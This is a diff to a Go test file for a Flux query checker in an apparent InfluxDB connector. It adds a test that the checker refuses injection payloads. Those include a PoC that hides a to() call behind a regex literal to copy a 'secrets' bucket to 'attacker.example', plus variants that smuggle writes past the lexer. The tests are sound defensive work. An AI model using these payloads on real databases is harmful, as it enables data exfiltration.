@@ -162,7 +162,12 @@ func TestTaskToggle(t *testing.T) {
 		t.Fatal(err)
 	}
 	for _, a := range m.Manifest().Actions {
-		if (a.Name == "enable_task" || a.Name == "disable_task") && (a.Risk != sdk.RiskWrite || !a.Reversible || !a.DryRun || a.Sensitive) {
+		// Enabling schedules server-side Flux that Conduit never checks.
+		want := sdk.RiskWrite
+		if a.Name == "enable_task" {
+			want = sdk.RiskDestructive
+		}
+		if (a.Name == "enable_task" || a.Name == "disable_task") && (a.Risk != want || !a.Reversible || !a.DryRun || a.Sensitive) {
 			t.Fatal(a.Name)
 		}
 	}
@@ -265,5 +270,39 @@ func TestRedirect(t *testing.T) {
 	}
 	if _, err := invoke(m, "buckets", `{}`, false); err == nil || leaked != "" {
 		t.Fatalf("followed the redirect: %v %q", err, leaked)
+	}
+}
+
+// Regular expression literals are lexed as Flux does, so a " or / inside
+// one can't make the check misread the code after it.
+func TestCheckFluxRegexLiterals(t *testing.T) {
+	for _, q := range []string{
+		`from(bucket: "b") |> range(start: -1h30m) |> filter(fn: (r) => r.host =~ /^web[0-9]+$/ and r.path !~ /a\/b/)`,
+		`from(bucket: "b") |> range(start: -1h) |> map(fn: (r) => ({r with v: r._value / 8.0, unit: "MB/s"}))`,
+		`from(bucket: "b") |> range(start: -1h) |> map(fn: (r) => ({r with v: (r.a + 1) / r.b / 2}))`,
+		`re = /x+/` + "\n" + `from(bucket: "b") |> range(start: -5mo) |> filter(fn: (r) => r.a =~ re or not exists r.c)`,
+		`from(bucket: "b") |> range(start: -1h) |> filter(fn: (r) => r.a == "a\"b // not a comment")`,
+	} {
+		if err := CheckFlux(q); err != nil {
+			t.Errorf("%q: %v", q, err)
+		}
+	}
+	for _, q := range []string{
+		// The PoC payloads: a regex holding " (read as a string, it hid
+		// to() and host:), and an escaped / in a regex (read as a comment).
+		"x = /\"/\nfrom(bucket: \"secrets\") |> range(start: -30d) |> to(bucket: \"loot\", host: \"https://attacker.example\", org: \"o\", token: \"t\")",
+		"from(bucket: \"b\") |> range(start: -1h) |> filter(fn: (r) => r._measurement =~ /a\\/\\// ) |> to(bucket: \"other\")",
+		// The same without the belt-and-braces refusals.
+		"x = /a/\nfrom(bucket: \"b\") |> range(start: -1h) |> to(bucket: \"loot\")",
+		"from(bucket: \"b\") |> range(start: -1h) |> filter(fn: (r) => r.m =~ /a\\/b/) |> to(bucket: \"other\")",
+		"from(bucket: \"b\", host: /x/ == /y/ or true, token: \"t\")",
+		"from(bucket: \"b\") |> range(start: -1h) |> filter(fn: (r) => r.m =~ /a)",
+		"f = () => { return 1 }\n/\"/ |> to(bucket: \"x\") \"",
+		"from(bucket: \"b\") |> range(start: -1h) |> 3to(bucket: \"x\")",
+		"from(bucket: \"b\") |> range(start: -1h)\n|> experimental.to(bucket: \"x\")",
+	} {
+		if err := CheckFlux(q); err == nil {
+			t.Errorf("accepted %q", q)
+		}
 	}
 }
